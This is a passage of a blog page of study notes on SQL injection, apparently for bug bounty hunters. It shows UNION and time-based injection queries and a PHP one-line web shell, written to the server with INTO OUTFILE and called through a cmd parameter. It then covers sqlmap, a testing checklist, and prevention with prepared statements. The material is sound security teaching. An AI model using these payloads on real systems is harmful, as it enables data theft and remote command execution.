+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">Title</span>, <span style="color:#66d9ef">Body</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">Emails</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">Username</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, column_name <span style="color:#66d9ef">FROM</span> information_schema<span style="color:#f92672">.</span>columns
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> table_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Users&#39;</span>
+</span></span></code></pre></div><p>For instance, you can determine a database’s version with a time-based technique like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">PremiumUsers</span> <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">Id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;2&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">IF</span>(<span style="color:#66d9ef">SUBSTR</span>(@@version, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#66d9ef">SLEEP</span>(<span style="color:#ae81ff">10</span>), <span style="color:#ae81ff">0</span>); <span style="color:#f92672">--</span>
+</span></span></code></pre></div><p>.</p>
+<p>.</p>
+<h2 id="gain-a-web-shell">Gain a Web Shell</h2>
+<p>The following piece of PHP code will take the request parameter named <strong>cmd and execute it as a system command</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span> <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>For example, you can write the password of a nonexistent user and the PHP code</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#a6e22e">Password</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">Users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">Username</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;abc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#e6db74">&#34;&lt;? system(</span><span style="color:#e6db74">$_REQUEST[&#39;cmd&#39;]</span><span style="color:#e6db74">); ?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">INTO</span> <span style="color:#a6e22e">OUTFILE</span> <span style="color:#e6db74">&#34;/var/www/html/shell.php&#34;</span>
+</span></span></code></pre></div><p>Since the password of the nonexistent user will be blank, you are essentially uploading the PHP script to the shell.php file. Then you can simply access your shell.php file and execute any command you wish:</p>
+<pre tabindex="0"><code>http://www.example.com/shell.php?cmd=COMMAND
+</code></pre><p>.</p>
+<p>.</p>
+<h1 id="automating-sql-injections"><code>Automating SQL Injections</code></h1>
+<p>Testing for SQL injection manually isn’t scalable. I recommend using tools to help you automate the entire process described in this chapter, from SQL
+injection discovery to exploitation. For example, sqlmap (<a href="http://sqlmap.org/">http://sqlmap.org/</a>) is a tool written in Python that automates the process of detecting and exploiting</p>
+<p>SQL injection vulnerabilities. A full tutorial of sqlmap is beyond the scope of this book, but you can find its documentation at <a href="https://github.com/sqlmapproject/sqlmap/wiki/">https://github.com/sqlmapproject/sqlmap/wiki/</a>.</p>
+<p>For example, you can integrate sqlmap into Burp by installing the <code>SQLiPy Burp plug-in</code>.</p>
+<hr>
+<h1 id="finding-your-first-sql-injection"><code>Finding Your First SQL Injection!</code></h1>
+<ol>
+<li>Map any of the application’s endpoints that take in user input.</li>
+<li>Insert <strong>test payloads</strong> into these locations to discover whether they’re vulnerable to SQL injections. If the endpoint isn’t vulnerable to classic SQL injections, try inferential techniques instead.</li>
+<li>Once you’ve confirmed that the endpoint is vulnerable to SQL injections, use different SQL injection queries to leak information from the database.</li>
+<li>Escalate the issue. Figure out what data you can leak from the endpoint and whether you can achieve an authentication bypass. Be careful not to execute any actions that would damage the integrity of the target’s
+database, such as deleting user data or modifying the structure of the database.</li>
+<li>Finally, draft up your first SQL injection report with an example payload that the security team can use to duplicate your results. Because SQL injections are quite technical to exploit most of the time, it’s a
+good idea to spend some time crafting an easy-to-understand proof of concept.</li>
+</ol>
+<hr>
+<h1 id="prevention"><code>Prevention</code></h1>
+<p>When the SQL program arrives at the SQL server, the server <strong>will parse, compile, and optimize it</strong>. Finally, the server will <strong>execute</strong> the program and return the results of the execution.</p>
+<p><img src="https://user-images.githubusercontent.com/70459751/184545113-f52295a8-1366-4598-a36f-c8cbe23fe5e6.png" alt="image"></p>
+<p>When you insert <strong>user-supplied</strong> input into your SQL queries, you are basically <strong>rewriting your program dynamically</strong>, using user input.</p>
+<p><img src="https://user-images.githubusercontent.com/70459751/184545117-007b0d66-f340-4c23-87ee-a4003b4e699b.png" alt="image"></p>
+<p>Prepared statements work by making sure that user-supplied data <strong>does not alter your SQL query’s logic</strong>.</p>
+<p>This means that instead of <strong>passing a complete SQL query to the server to be compiled</strong>, you define all the <strong>SQL logic first</strong>, <strong>compile it</strong>, and then <strong>insert user-supplied parameters into the query</strong> right before execution</p>
+<p><img src="https://user-images.githubusercontent.com/70459751/184545122-1a783b0a-50e9-4693-9294-4070117ff6db.png" alt="image"></p>
+<p>.</p>
+<p>.</p>
+<p>Let’s look at an example of how to <strong>execute SQL statements safely in PHP</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Id <span style="color:#66d9ef">FROM</span> Users <span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span>USERNAME <span style="color:#66d9ef">AND</span> Password<span style="color:#f92672">=</span>PASSWORD; <span style="color:#75715e">--retrieve user id by username and password
+</span></span></span></code></pre></div><p>Here’s how to do that in PHP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$mysqli <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>(<span style="color:#e6db74">&#34;mysql_host&#34;</span>, <span style="color:#e6db74">&#34;mysql_username&#34;</span>, <span style="color:#e6db74">&#34;mysql_password&#34;</span>, <span style="color:#e6db74">&#34;database_name&#34;</span>); <span style="color:#75715e">//establishing the connection
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;username&#34;</span>]; <span style="color:#ae81ff">2</span> <span style="color:#75715e">//retrive usename
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;password&#34;</span>]; <span style="color:#ae81ff">3</span> <span style="color:#75715e">//retrive password
+</span></span></span></code></pre></div><p>To use a prepared statement, you would <strong>define the structure of the query first</strong>. We’ll write out the query <strong>without its parameters</strong>, and put question marks as placeholders for the parameters</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$stmt <span style="color:#f92672">=</span> $mysqli<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT Id FROM Users WHERE Username=? AND Password=?&#34;</span>);
+</span></span></code></pre></div><p>The following line of code will insert the <strong>user input into the SQL query</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;ss&#34;</span>, $username, $password);
+</span></span></code></pre></div><p>Finally, you execute the query: <code>$stmt-&gt;execute();</code></p>
+<p>Therefore, if an attacker provides the application with a <strong>malicious input like this one</strong>, the entire input would be treated as <strong>plain data, not as SQL code</strong>:  <code>Password12345';—</code></p>
+<p>More of : <a href="https://en.wikipedia.org/wiki/Prepared_statement">Prepared statement - Wikipedia</a></p>
+<p>.</p>
+<p>.</p>
+<p><strong>Special characters that should be sanitized</strong> or escaped include the single quote (&rsquo;) and double quote (&rdquo;), but special characters specific to each type of database also exist. For more information about SQL input sanitization, read
+OWASP’s cheat sheet at <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention - OWASP Cheat Sheet Series</a></p>
+<p>Additionally, you should follow the principle of <code>least privilege</code> when assigning rights to applications. This means that applications should run with only the privileges they require to operate.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
